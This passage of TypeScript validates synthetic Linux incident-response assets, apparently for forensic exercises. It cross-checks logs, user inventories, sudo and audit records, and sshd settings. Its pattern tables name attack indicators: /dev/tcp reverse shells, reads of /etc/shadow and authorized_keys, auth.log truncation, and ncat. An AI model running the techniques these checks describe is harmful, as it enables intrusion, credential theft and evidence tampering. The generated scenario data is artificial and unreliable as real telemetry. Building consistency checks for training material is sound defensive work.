    /\b(?:with a|using host|using|with|and)\s*$/im.test(joined)
  ) {
    throw new Error("Linux asset validation failed: malformed generated narrative text detected.");
  }

  if (
    /^apt,running,enabled/im.test(joined) ||
    /\bStarted apt\./i.test(joined) ||
    /\bapt service\b/i.test(joined)
  ) {
    throw new Error("Linux asset validation failed: APT is modeled as a daemon/service.");
  }

  for (const asset of assets.filter((item) => item.file_path.endsWith(".csv"))) {
    parseCsv(asset.content, asset.file_path);
  }

  const chronologicalFiles = [
    "assets/logs/auth.log",
    "assets/logs/sudo.log",
    "assets/logs/audit.log",
    "assets/journal/journal_ssh.txt",
    "assets/journal/journal_systemd.txt",
    "assets/logs/syslog",
    "assets/logs/kern.log",
    "assets/logs/cron.log",
    "assets/logs/apt_history.log",
  ];

  for (const filePath of chronologicalFiles) {
    const asset = assets.find((item) => item.file_path === filePath);
    if (asset) {
      ensureChronological(filePath, asset.content);
      ensureNoMechanicalCadence(filePath, asset.content);
    }
  }

  const timeline = context.timelineEvents.map((event) => event.time);
  const sorted = [...timeline].sort();
  if (timeline.some((time, index) => time !== sorted[index])) {
    throw new Error("Linux asset validation failed: timeline is not chronological.");
  }

  const genericTimeline = context.timelineEvents.find((event) =>
    /activity requiring investigation began|account authenticated or executed activity|service activity observed|event requires review|service state changed or required review/i.test(
      event.summary
    )
  );
  if (genericTimeline) {
    throw new Error(
      `Linux asset validation failed: generic timeline wording at ${genericTimeline.time}.`
    );
  }

  const weakTimeline = context.timelineEvents.find(
    (event) =>
      !/(\/|[a-z0-9._-]+\.service\b|\b\d{1,3}(?:\.\d{1,3}){3}\b|\b(?:ssh|sudo|apt|dpkg|docker|systemctl|cron|crontab|ncat|auth\.log|journal|archive|package|public-key|password)\b)/i.test(
        event.summary
      )
  );
  if (weakTimeline) {
    throw new Error(
      `Linux asset validation failed: timeline event lacks concrete evidence detail at ${weakTimeline.time}.`
    );
  }

  const assetPaths = new Set(assets.map((asset) => asset.file_path));
  const assetByBasename = new Map<string, string>();
  for (const asset of assets) {
    const basename = asset.file_path.split("/").at(-1);
    if (basename) assetByBasename.set(basename, asset.file_path);
  }

  for (const expected of ["assets/logs/auth.log", "assets/evidence/timeline.csv"]) {
    if (!assetPaths.has(expected)) {
      throw new Error(`Linux asset validation failed: missing ${expected}.`);
    }
  }

  for (const event of context.timelineEvents) {
    const sourceFiles = event.source.split(";").map((source) => source.trim());
    let hasAvailableSource = false;

    for (const source of sourceFiles) {
      const exists =
        assetPaths.has(source) ||
        assetPaths.has(`assets/logs/${source}`) ||
        assetPaths.has(`assets/evidence/${source}`) ||
        assetPaths.has(`assets/reports/${source}`) ||
        assetByBasename.has(source);

      hasAvailableSource = hasAvailableSource || exists;
    }

    if (!hasAvailableSource) {
      throw new Error(
        `Linux asset validation failed: no available source for timeline event ${event.time}.`
      );
    }
  }

  const incidentWindowText = `${context.incidentWindowStart}-${context.incidentWindowEnd}`;
  const incidentBrief = assets.find(
    (asset) => asset.file_path === "assets/evidence/incident_brief.md"
  );
  if (incidentBrief && !incidentBrief.content.includes(incidentWindowText)) {
    throw new Error("Linux asset validation failed: incident brief missing incident window.");
  }

  const spoilerPatterns = [
    /^Incident type:/im,
    /^Primary user:/im,
    /root cause:/i,
    /attacker/i,
    /privilege escalation success/i,
  ];
  const spoilerDocs = assets.filter((asset) =>
    [
      "assets/evidence/audit_notes.md",
      "assets/evidence/incident_brief.md",
      "assets/evidence/analyst_working_notes.md",
    ].includes(asset.file_path)
  );

  for (const doc of spoilerDocs) {
    const spoiler = spoilerPatterns.find((pattern) => pattern.test(doc.content));
    if (spoiler) {
      throw new Error(`Linux asset validation failed: spoiler language in ${doc.file_path}.`);
    }
  }

  const serviceInventory = assets.find(
    (asset) => asset.file_path === "assets/reports/service_inventory.txt"
  );
  if (
    serviceInventory &&
    context.incidentFamily !== "unauthorized_package_install" &&
    !serviceInventory.content.includes(context.affectedService)
  ) {
    throw new Error(
      `Linux asset validation failed: service ${context.affectedService} missing from service inventory.`
    );
  }

  const permissionsReport = assets.find(
    (asset) => asset.file_path === "assets/reports/permissions_report.txt"
  );
  if (permissionsReport) {
    const permissionPaths = permissionsReport.content
      .split("\n")
      .map((line) => line.trim().split(/\s+/)[0])
      .filter((path) => path?.startsWith("/"));
    const duplicatePermissionPath = permissionPaths.find(
      (path, index) => permissionPaths.indexOf(path) !== index
    );
    if (duplicatePermissionPath) {
      throw new Error(
        `Linux asset validation failed: duplicate permission row ${duplicatePermissionPath}.`
      );
    }

    const hostRole = context.hostRole.toLowerCase();
    const webLikeRole = hostRole.includes("web") || hostRole.includes("application");
    const webIncident = context.incidentFamily === "reverse_shell";
    const webPath = permissionPaths.find((path) =>
      /\/var\/www\/|\/etc\/nginx\/|\/etc\/apache2\/|wordpress/i.test(path)
    );
    if (webPath && !webLikeRole && !webIncident) {
      throw new Error(
        `Linux asset validation failed: web permission path ${webPath} leaked into ${context.hostRole}.`
      );
    }
  }

  const usersCsv = assets.find((asset) => asset.file_path === "assets/csv/users.csv");
  const groupsCsv = assets.find((asset) => asset.file_path === "assets/csv/groups.csv");
  const passwd = assets.find((asset) => asset.file_path === "assets/accounts/passwd.sample");
  const knownSystemAccounts = new Set([
    "root",
    "syslog",
    "adm",
    "www-data",
    "postgres",
    "mysql",
    "messagebus",
    "nobody",
    "systemd-network",
    "systemd-resolve",
    "bind",
    "postfix",
    "rspamd",
    "prometheus",
    "grafana-agent",
    "git",
    "gitlab-runner",
    "systemd-timesync",
  ]);
  const knownUsers = new Set<string>([
    ...context.secondaryUsers,
    ...context.serviceAccounts,
    ...context.adminAccounts,
    context.primaryUser,
    "former-admin",
    "devops",
    "auditor",
  ]);
  const userInventory = new Map<string, { uid: string; gid: string; role: string; status: string; home: string; shell: string; kind: string }>();
  const uidOwners = new Map<string, string>();
  const gidOwners = new Map<string, string>();

  if (usersCsv) {
    const rows = parseCsv(usersCsv.content, usersCsv.file_path);
    const header = rows[0] || [];
    const usernameIndex = header.indexOf("username");
    const roleIndex = header.indexOf("role");
    const statusIndex = header.indexOf("status");
    const uidIndex = header.indexOf("uid");
    const gidIndex = header.indexOf("gid");
    const homeIndex = header.indexOf("home_directory");
    const shellIndex = header.indexOf("shell");
    const kindIndex = header.indexOf("account_type");

    for (const required of ["username", "role", "status", "uid", "gid", "home_directory", "shell", "account_type"]) {
      if (!header.includes(required)) {
        throw new Error(`Linux asset validation failed: users.csv missing ${required} header.`);
      }
    }

    for (const row of rows.slice(1)) {
      const username = row[usernameIndex];
      if (!username) continue;
      if (userInventory.has(username)) {
        throw new Error(`Linux asset validation failed: duplicate user ${username} in users.csv.`);
      }

      const uid = row[uidIndex];
      const gid = row[gidIndex];
      if (uidOwners.has(uid)) {
        throw new Error(
          `Linux asset validation failed: uid ${uid} assigned to both ${uidOwners.get(uid)} and ${username}.`
        );
      }
      if (gidOwners.has(gid)) {
        throw new Error(
          `Linux asset validation failed: gid ${gid} assigned to both ${gidOwners.get(gid)} and ${username}.`
        );
      }

      uidOwners.set(uid, username);
      gidOwners.set(gid, username);
      userInventory.set(username, {
        uid,
        gid,
        role: row[roleIndex],
        status: row[statusIndex],
        home: row[homeIndex],
        shell: row[shellIndex],
        kind: row[kindIndex],
      });
      knownUsers.add(username);
    }
  }

  if (passwd) {
    for (const line of passwd.content.split("\n")) {
      const parts = line.split(":");
      const username = parts[0];
      if (username) knownUsers.add(username);
      const inventory = userInventory.get(username);
      if (inventory && (parts[2] !== inventory.uid || parts[3] !== inventory.gid)) {
        throw new Error(
          `Linux asset validation failed: passwd uid/gid for ${username} does not match users.csv.`
        );
      }
      if (inventory && parts[5] !== inventory.home) {
        throw new Error(
          `Linux asset validation failed: passwd home for ${username} does not match users.csv.`
        );
      }
      if (inventory && parts[6] !== inventory.shell) {
        throw new Error(
          `Linux asset validation failed: passwd shell for ${username} does not match users.csv.`
        );
      }
    }
  }

  if (groupsCsv) {
    for (const row of parseCsv(groupsCsv.content, groupsCsv.file_path).slice(1)) {
      for (const member of (row[1] || "").split(",")) {
        const trimmed = member.trim();
        if (trimmed && !knownUsers.has(trimmed) && !knownSystemAccounts.has(trimmed)) {
          throw new Error(`Linux asset validation failed: group member ${trimmed} is not inventoried.`);
        }
      }
    }
  }

  const userTokens = new Set<string>();
  const userPatterns = [
    /\bfor user ([a-z0-9._-]+)/gi,
    /\bfor ([a-z0-9._-]+) from /gi,
    /\bsudo: ([a-z0-9._-]+) :/gi,
    /\bCRON\[\d+\]: \(([a-z0-9._-]+)\)/gi,
    /^([a-z0-9._-]+)\s+\d+\s+\d+\s+/gim,
    /\bacct="([a-z0-9._-]+)"/gi,
  ];

  for (const asset of assets) {
    for (const pattern of userPatterns) {
      for (const match of asset.content.matchAll(pattern)) {
        userTokens.add(match[1]);
      }
    }
  }

  for (const username of userTokens) {
    if (
      !knownUsers.has(username) &&
      !knownSystemAccounts.has(username) &&
      !["admin", "test", "oracle", "guest"].includes(username)
    ) {
      throw new Error(`Linux asset validation failed: user ${username} is not inventoried.`);
    }
  }

  if (serviceInventory) {
    const serviceRows = parseCsv(serviceInventory.content, serviceInventory.file_path);
    const serviceNames = serviceRows.slice(1).map((row) => row[0]?.trim()).filter(Boolean);
    const duplicateService = serviceNames.find(
      (name, index) => serviceNames.indexOf(name) !== index
    );

    if (duplicateService) {
      throw new Error(
        `Linux asset validation failed: duplicate service ${duplicateService}.`
      );
    }

    const placeholderService = serviceNames.find((name) =>
      /background-unit|^service-\d+|\/|undefined|null/i.test(name)
    );
    if (placeholderService) {
      throw new Error(
        `Linux asset validation failed: placeholder or malformed service ${placeholderService}.`
      );
    }

    const auditLog = assets.find((asset) => asset.file_path === "assets/logs/audit.log");
    const auditdRow = serviceRows.find((row) => row[0] === "auditd.service");

    if (
      auditLog &&
      auditLog.content.includes("type=") &&
      (!auditdRow ||
        auditdRow.includes("inactive") ||
        auditdRow.includes("disabled") ||
        auditdRow.join(",").toLowerCase().includes("unavailable"))
    ) {
      throw new Error(
        "Linux asset validation failed: audit.log exists while auditd is unavailable."
      );
    }

    const role = context.hostRole.toLowerCase();
    const roleKind =
      role.includes("ci") || role.includes("git")
        ? "platform"
        : role.includes("web") || role.includes("application")
        ? "web"
        : role.includes("backup")
        ? "backup"
        : role.includes("docker") || role.includes("container") || role.includes("kubernetes")
        ? "container"
        : role.includes("dns")
        ? "dns"
        : role.includes("mail")
        ? "mail"
        : role.includes("proxy") || role.includes("vpn") || role.includes("ssh") || role.includes("jump") || role.includes("bastion")
        ? "access"
        : role.includes("monitoring")
        ? "monitoring"
        : role.includes("database")
        ? "database"
        : "general";
    const allowedByIncident = new Set<string>();
    if (context.incidentFamily === "reverse_shell") allowedByIncident.add("apache2.service");
    if (context.incidentFamily === "docker_compromise") {
      allowedByIncident.add("docker.service");
      allowedByIncident.add("containerd.service");
    }
    if (context.incidentFamily === "data_staging" || context.incidentFamily === "service_account_misuse") {
      allowedByIncident.add("backup-agent.service");
      allowedByIncident.add("rsync.service");
    }
    const incompatible = serviceNames.find((name) => {
      if (allowedByIncident.has(name)) return false;
      if (
        [
          "ssh.service",
          "cron.service",
          "ufw.service",
          "rsyslog.service",
          "auditd.service",
          "node_exporter.service",
          "systemd-resolved.service",
          "systemd-journald.service",
          "systemd-logind.service",
          "systemd-networkd.service",
          "systemd-timesyncd.service",
        ].includes(name)
      ) return false;
      if (/^(apache2|nginx|php8\.3-fpm)\.service$/.test(name)) return roleKind !== "web";
      if (/^(postgresql|pgbouncer)\.service$/.test(name)) return roleKind !== "database";
      if (/^(docker|containerd|kubelet|kube-proxy)\.service$/.test(name)) return !["container", "platform"].includes(roleKind);
      if (/^bind9\.service$/.test(name)) return roleKind !== "dns";
      if (/^(postfix|opendkim|rspamd)\.service$/.test(name)) return roleKind !== "mail";
      if (/^(gitlab-runner|gitaly)\.service$/.test(name)) return roleKind !== "platform";
      if (/^(prometheus|grafana-agent|node_exporter|promtail)\.service$/.test(name)) return roleKind !== "monitoring";
      if (/^(backup-agent|rsync|restic)\.(service|timer)$/.test(name)) return roleKind !== "backup";
      return false;
    });

    if (incompatible) {
      throw new Error(
        `Linux asset validation failed: ${incompatible} does not match host role ${context.hostRole}.`
      );
    }
  }

  const auditLog = assets.find((asset) => asset.file_path === "assets/logs/audit.log");
  const processSnapshot = assets.find(
    (asset) => asset.file_path === "assets/runtime/process_snapshot.txt"
  );
  const sudoLog = assets.find((asset) => asset.file_path === "assets/logs/sudo.log");
  const journalSsh = assets.find((asset) => asset.file_path === "assets/journal/journal_ssh.txt");
  const openFiles = assets.find((asset) => asset.file_path === "assets/runtime/open_files.txt");
  const processHistory = assets.find((asset) => asset.file_path === "assets/runtime/process_execution_history.txt");
  const fileAccessHistory = assets.find((asset) => asset.file_path === "assets/runtime/file_access_history.csv");
  const sshdConfig = assets.find((asset) => asset.file_path === "assets/configs/ssh/sshd_config");

  if (auditLog && openFiles) {
    for (const match of auditLog.content.matchAll(/type=([A-Z_]+).*?pid=(\d+).*?cmd="([^"]+)"/gi)) {
      const [, auditType, pid, command] = match;
      const historyRows = fileAccessHistory?.content
        .split("\n")
        .filter((line) => line.includes(`,${pid},`)) || [];
      if (!openFiles.content.includes(pid) && historyRows.length === 0) {
        if (processSnapshot && !new RegExp(`\\s${pid}\\s`).test(processSnapshot.content) && processHistory?.content.includes(`,${pid},`)) {
          continue;
        }
        throw new Error(
          `Linux asset validation failed: PID ${pid} from audit.log missing from open_files.txt or file_access_history.csv.`
        );
      }

      const pidRows = openFiles.content
        .split("\n")
        .filter((line) => new RegExp(`\\s${pid}\\s`).test(line));
      const supportRows = [...pidRows, ...historyRows];
      if (auditType === "USER_CMD" && pidRows.some((line) => /\bsudo\b/.test(line))) {
        if (!pidRows.some((line) => /sudoers/.test(line))) {
          throw new Error(
            `Linux asset validation failed: sudo PID ${pid} missing sudoers open file.`
          );
        }
        continue;
      }
      if (
        pidRows.some((line) => line.includes("/usr/local/sbin/health-check.sh")) &&
        !command.includes("health-check")
      ) {
        throw new Error(
          `Linux asset validation failed: PID ${pid} open file does not match command ${command}.`
        );
      }

      const commandHints: Record<string, RegExp> = {
        apt: /\/var\/log\/apt\/history\.log|\/var\/lib\/dpkg\/status|\/var\/cache\/apt/i,
        "apt-cache": /\/var\/lib\/dpkg\/status|\/var\/lib\/apt\/lists|\/var\/cache\/apt/i,
        dpkg: /\/var\/lib\/dpkg\/status|\/usr\/bin\/ncat/i,
        cat: /\/etc\/shadow|authorized_keys|\/etc\/group|\/etc\/cron\.d|\/etc\/systemd\/system/i,
        tar: /\/tmp\/|\/home|\/srv\/shared/i,
        rsync: /\/srv\/shared|\/tmp\/export/i,
        truncate: /\/var\/log\/auth\.log/i,
        logrotate: /\/etc\/logrotate\.conf|\/var\/log/i,
        systemctl: /\/etc\/systemd\/system|\.service/i,
        docker: /\/var\/run\/docker\.sock|\/srv\/shared|\/var\/lib\/docker/i,
        curl: /\/tmp\/|\/var\/www/i,
        bash: /\/dev\/tcp|\/var\/www|\/tmp/i,
        crontab: /\/etc\/cron\.d|\/var\/spool\/cron/i,
        stat: /\/etc\/cron\.d|authorized_keys|\/etc\/systemd\/system|\/var\/log|\/tmp|\/srv\//i,
        chmod: /\/usr\/local\/sbin|\/var\/www|\/tmp/i,
      };
      const normalizedCommand = command.toLowerCase();
      const executableName = normalizedCommand.trim().split(/\s+/)[0]?.split("/").pop() || "";
      const operandEvidence = linuxReadOperandsHaveEvidence({ command, pid, openRows: pidRows, history: fileAccessHistory?.content });
      if (operandEvidence !== undefined) {
        if (!operandEvidence) {
          throw new Error(`Linux asset validation failed: PID ${pid} file-access rows do not support exact operand paths for ${command}.`);
        }
        continue;
      }
      const commandKey = commandHints[executableName]
        ? executableName
        : Object.keys(commandHints).find((key) =>
            new RegExp(`(?:^|[\\s/])${key}(?:$|[\\s.-])`).test(normalizedCommand)
          );
      if (
        commandKey &&
        !supportRows.some((line) => commandHints[commandKey].test(line))
      ) {
        throw new Error(
          `Linux asset validation failed: PID ${pid} file-access rows do not support command ${command}.`
        );
      }
    }
  }

  if (auditLog && processSnapshot && auditLog.content.includes("pid=2204")) {
    if (!/\s2204\s+\d+\s+/.test(processSnapshot.content) && !processHistory?.content.includes(",2204,")) {
      throw new Error("Linux asset validation failed: audit PID 2204 missing from live snapshot and process history.");
    }
  }

  if (processSnapshot) {
    const pidOwners = new Map<string, string>();
    for (const match of processSnapshot.content.matchAll(/^([a-z0-9._-]+)\s+(\d+)\s+\d+\s+/gim)) {
      const [, user, pid] = match;
      const existing = pidOwners.get(pid);
      if (existing && existing !== user) {
        throw new Error(
          `Linux asset validation failed: PID ${pid} maps to both ${existing} and ${user}.`
        );
      }
      pidOwners.set(pid, user);
    }
  }

  if (auditLog) {
    for (const match of auditLog.content.matchAll(/auid=(\d+).*?acct="([a-z0-9._-]+)"/gi)) {
      const [, uid, username] = match;
      const inventory = userInventory.get(username);
      if (inventory && inventory.uid !== uid) {
        throw new Error(
          `Linux asset validation failed: audit auid for ${username} does not match users.csv.`
        );
      }
    }
  }

  const authLog = assets.find((asset) => asset.file_path === "assets/logs/auth.log");
  if (authLog) {
    for (const match of authLog.content.matchAll(/session opened for user ([a-z0-9._-]+)\(uid=(\d+)\)/gi)) {
      const [, username, uid] = match;
      const inventory = userInventory.get(username);
      if (inventory && inventory.uid !== uid) {
        throw new Error(
          `Linux asset validation failed: auth uid for ${username} does not match users.csv.`
        );
      }
    }
  }

  if (sudoLog) {
    for (const match of sudoLog.content.matchAll(/^(\d{4}-\d{2}-\d{2})\s+\d{2}:\d{2}:\d{2}\s+([a-z0-9._-]+)\s+:.*?PWD=([^ ;]+)/gim)) {
      const [, , username, pwd] = match;
      const inventory = userInventory.get(username);
      if (
        inventory &&
        ![
          inventory.home,
          "/tmp",
          "/var/tmp",
          "/srv/shared",
          "/",
          "/root",
        ].some((allowed) => pwd === allowed || pwd.startsWith(`${allowed}/`))
      ) {
        throw new Error(
          `Linux asset validation failed: sudo PWD ${pwd} is inconsistent with ${username} home ${inventory.home}.`
        );
      }
    }
  }

  if (sshdConfig) {
    const passwordNo = /^PasswordAuthentication\s+no$/im.test(sshdConfig.content);
    const pubkeyNo = /^PubkeyAuthentication\s+no$/im.test(sshdConfig.content);
    const rootNo = /^PermitRootLogin\s+no$/im.test(sshdConfig.content);
    const allowUsers = sshdConfig.content.match(/^AllowUsers\s+(.+)$/im)?.[1]
      .split(/\s+/)
      .filter(Boolean);
    const sshEvidence = [authLog?.content || "", journalSsh?.content || ""].join("\n");

    if (passwordNo && /Accepted password/i.test(sshEvidence)) {
      throw new Error("Linux asset validation failed: password SSH success contradicts sshd_config.");
    }
    if (pubkeyNo && /Accepted publickey/i.test(sshEvidence)) {
      throw new Error("Linux asset validation failed: publickey SSH success contradicts sshd_config.");
    }
    if (rootNo && /Accepted \S+ for root\b/i.test(sshEvidence)) {
      throw new Error("Linux asset validation failed: root SSH success contradicts sshd_config.");
    }
    if (allowUsers?.length) {
      for (const match of sshEvidence.matchAll(/Accepted \S+ for ([a-z0-9._-]+)/gi)) {
        const user = match[1];
        if (!allowUsers.includes(user)) {
          throw new Error(
            `Linux asset validation failed: SSH success for ${user} is not allowed by sshd_config.`
          );
        }
      }
    }

    if (auditLog) {
      const auditSshUsers = [
        ...auditLog.content.matchAll(/\btype=(?:LOGIN|USER_ACCT)\b.*?\bacct="([a-z0-9._-]+)".*?\bexe="\/usr\/sbin\/sshd".*?\bres=success/gi),
      ].map((match) => match[1]);
      const supportingSshEvidence = [authLog?.content || "", journalSsh?.content || ""].join("\n");

      for (const user of auditSshUsers) {
        const inventory = userInventory.get(user);
        const serviceException =
          user === context.primaryUser &&
          ["service_account_misuse", "data_staging"].includes(context.incidentFamily);

        if (allowUsers?.length && !allowUsers.includes(user)) {
          throw new Error(
            `Linux asset validation failed: audit SSH success for ${user} is not allowed by sshd_config.`
          );
        }
        if (inventory?.shell === "/usr/sbin/nologin" && !serviceException) {
          throw new Error(
            `Linux asset validation failed: audit SSH success for nologin account ${user}.`
          );
        }
        if (inventory?.kind === "service" && !serviceException) {
          throw new Error(
            `Linux asset validation failed: audit SSH success for service account ${user}.`
          );
        }
        if (
          serviceException &&
          !supportingSshEvidence.includes(`for ${user} `) &&
          !supportingSshEvidence.includes(`for ${user}\n`)
        ) {
          throw new Error(
            `Linux asset validation failed: service-account audit SSH event for ${user} lacks auth or journal support.`
          );
        }
      }
    }
  }

  if (processSnapshot) {
    const sshSessions = [...processSnapshot.content.matchAll(/sshd:\s+([a-z0-9._-]+)(?:@|\s+\[priv\])/gi)].map((match) => match[1]);
    if (sshSessions.length > 6) {
      throw new Error("Linux asset validation failed: excessive interactive SSH sessions in process snapshot.");
    }

    for (const user of sshSessions) {
      const inventory = userInventory.get(user);
      const justified =
        inventory?.kind !== "service" ||
        ["service_account_misuse", "data_staging"].includes(context.incidentFamily);
      if (inventory && !justified) {
        throw new Error(
          `Linux asset validation failed: service account ${user} has unjustified interactive SSH process.`
        );
      }
      const supportingAuth = [authLog?.content || "", journalSsh?.content || ""].join("\n");
      if (!supportingAuth.includes(`for ${user} `) && !supportingAuth.includes(`for ${user}\n`)) {
        throw new Error(
          `Linux asset validation failed: process snapshot user ${user} lacks SSH evidence.`
        );
      }
    }
  }

  const packageInventory = assets.find((asset) => asset.file_path === "assets/inventory/package_inventory.txt");
  if (packageInventory) {
    const packageNames = [...packageInventory.content.matchAll(/^ii\s+([a-z0-9.+-]+)/gim)].map((match) => match[1]);
    const duplicatePackage = packageNames.find((name, index) => packageNames.indexOf(name) !== index);
    if (duplicatePackage) {
      throw new Error(`Linux asset validation failed: duplicate package ${duplicatePackage}.`);
    }
  }

  if (journalSsh && processSnapshot && journalSsh.content.includes("sshd[2136]")) {
    const hasSessionProcess = /\s2136\s+812\s+/.test(processSnapshot.content);
    if (hasSessionProcess && !/\s2201\s+2136\s+/.test(processSnapshot.content)) {
      throw new Error("Linux asset validation failed: SSH session PID relationship missing from process snapshot.");
    }
  }

  if (
    sudoLog &&
    !validationCommandVariants(context.suspiciousCommands[0], context).some((command) => sudoLog.content.includes(command)) &&
    context.incidentFamily !== "ssh_bruteforce"
  ) {
    throw new Error("Linux asset validation failed: sudo log missing suspicious command.");
  }

  const validationCommands = validationCommandVariants(context.suspiciousCommands[0], context);
  const validationCommand = validationCommands.find((command) => sudoLog?.content.includes(command));
  if (sudoLog && auditLog && validationCommand) {
    const escapedCommand = validationCommand.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    const sudoMatch = sudoLog.content.match(
      new RegExp(`(\\d{4}-\\d{2}-\\d{2})\\s+(\\d{2}:\\d{2}:\\d{2}).*?PWD=([^ ;]+).*?COMMAND=${escapedCommand}`)
    );
    const auditMatch = auditLog.content.match(
      new RegExp(`audit\\((\\d{4}-\\d{2}-\\d{2})\\s+(\\d{2}:\\d{2}:\\d{2})\\):.*?cwd="([^"]+)".*?cmd="${escapedCommand}"`)
    );

    if (sudoMatch && auditMatch) {
      if (sudoMatch[1] !== auditMatch[1] || sudoMatch[2] !== auditMatch[2]) {
        throw new Error("Linux asset validation failed: sudo and audit command timestamps disagree.");
      }
      if (sudoMatch[3] !== auditMatch[3]) {
        throw new Error("Linux asset validation failed: sudo and audit working directories disagree.");
      }
    }
  }

  if (
    openFiles &&
    !context.modifiedFiles.some((file) => openFiles.content.includes(file) || fileAccessHistory?.content.includes(file)) &&
    !openFiles.content.includes("bash")
  ) {
    throw new Error("Linux asset validation failed: runtime file evidence does not support modified file context.");
  }

  const configPack = assets.find(
    (asset) => asset.file_path === "assets/configs/linux_config_pack.txt"
  );
  const sudoersPlatform = assets.find(
    (asset) => asset.file_path === "assets/configs/sudoers.d/platform"
  );

  if (
    configPack &&
    sudoersPlatform &&
    /\/usr\/bin\/tar|\/usr\/bin\/rsync|\/usr\/bin\/systemctl \*/.test(
      sudoersPlatform.content
    ) &&
    configPack.content.includes("No unusual sudo exceptions observed")
  ) {
    throw new Error(
      "Linux asset validation failed: sudoers exception contradicts config summary."
    );
  }

  const policy = assets.find((asset) => asset.file_path === "assets/docs/security_policy.md");
  const ticket = assets.find((asset) => asset.file_path === "assets/docs/maintenance_ticket.md");
  const change = assets.find((asset) => asset.file_path === "assets/docs/change_request.md");

  if (policy && (!policy.content.includes(context.ticketId) || !policy.content.includes(context.changeId))) {
    throw new Error("Linux asset validation failed: policy references are incomplete.");
  }
  if (ticket && !ticket.content.includes(context.changeId)) {
    throw new Error("Linux asset validation failed: ticket does not reference change request.");
  }
  if (change && !change.content.includes(context.ticketId)) {
    throw new Error("Linux asset validation failed: change request does not reference ticket.");
  }
}
